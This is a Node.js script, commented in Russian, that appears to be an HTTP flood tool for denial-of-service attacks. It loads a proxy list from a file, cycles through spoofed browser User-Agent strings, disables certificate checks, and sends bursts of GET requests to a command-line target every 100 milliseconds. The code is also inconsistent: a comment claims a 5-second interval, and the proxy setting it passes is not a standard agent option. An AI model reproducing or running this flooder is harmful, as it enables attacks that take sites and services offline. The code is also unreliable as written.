const https = require('https');
const fs = require('fs');

console.log('Starting...');
console.log(`> Target: ${process.argv[2]}`);

const ua = [
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0"
];

// Чтение файла
fs.readFile('mw.txt', 'utf8', (err, data) => {
    if (err) {
        console.error(err);
        return;
    }
    // Разделение файла на строки
    const lines = data.trim().split('\n').map(line => "http://" + line.trim());

    // Функция для отправки запросов
    const start = (url) => {
        lines.forEach(proxy => {
            ua.forEach(u => {
                const options = {
                    method: 'GET',
                    headers: {'User-Agent': u},
                    timeout: 2000,
                    rejectUnauthorized: false,
                    agent: new https.Agent({ rejectUnauthorized: false, proxy: proxy })
                };

                const req = https.request(url, options, (res) => {
                    console.log(`Response Status Code: ${res.statusCode}`);
                });

                req.on('error', (err) => {
                    console.error(`Request Error: ${err}`);
                });

                req.end();
            });
        });
    };

    // Запускаем отправку запросов каждые 5 секунд
    setInterval(() => {
        start(process.argv[2]);
    }, 100);
});